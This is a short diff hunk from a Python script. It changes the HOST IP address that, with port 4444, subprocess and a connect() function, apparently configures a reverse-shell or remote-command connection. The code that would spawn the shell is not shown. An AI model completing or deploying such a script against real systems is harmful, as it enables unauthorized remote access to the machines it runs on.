@@ -3,7 +3,7 @@ import subprocess
 import os
 
 # Define the IP address and port number
-HOST = '192.168.1.77'  # Replace with the desired IP address
+HOST = '192.168.224.66'  # Replace with the desired IP address
 PORT = 4444  # Replace with the desired port number
 
 def connect():
